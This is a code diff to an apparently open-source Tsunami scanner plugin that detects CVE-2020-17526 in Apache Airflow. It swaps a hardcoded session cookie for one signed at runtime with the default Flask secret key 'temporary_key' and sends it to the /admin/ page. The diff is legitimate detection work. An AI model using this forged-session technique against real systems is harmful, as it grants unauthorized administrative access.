@@ -38,6 +38,7 @@ import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.NotImplementedException;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
+import com.google.tsunami.plugins.cve202017526.flasksessionsigner.FlaskSessionSigner;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
@@ -47,6 +48,7 @@ import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
+
 import java.io.IOException;
 import java.net.HttpCookie;
 import java.net.URLEncoder;
@@ -72,8 +74,6 @@ import javax.inject.Inject;
 @ForWebService
 public final class Cve202017526Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-  private static final String SESSION_COOKIE =
-      "session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.ZgdmZA.GDwzAupY1c9AXYDbLRvjSiZCVw0";
   private static final Pattern CSRF_PATTERN = Pattern.compile("var CSRF = \"([\\d\\w-.]+)\"");
 
   private final Clock utcClock;
@@ -172,10 +172,21 @@ public final class Cve202017526Detector implements VulnDetector {
       throws IOException {
     String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
     Map<String, String> results = new HashMap<>();
+
+    FlaskSessionSigner newToken =
+        new FlaskSessionSigner(
+            "{\"_fresh\":true,\"user_id\":1,\"_permanent\":true}",
+            "Zzx63w",
+            "temporary_key",
+            "cookie-session");
+
     HttpResponse firstResponse =
         this.httpClient.send(
             HttpRequest.get(rootUrl + "admin/")
-                .setHeaders(HttpHeaders.builder().addHeader("Cookie", SESSION_COOKIE).build())
+                .setHeaders(
+                    HttpHeaders.builder()
+                        .addHeader("Cookie", String.format("session=%s", newToken.dumps()))
+                        .build())
                 .build(),
             networkService);
     if (!(firstResponse.headers().get("Set-Cookie").isPresent()
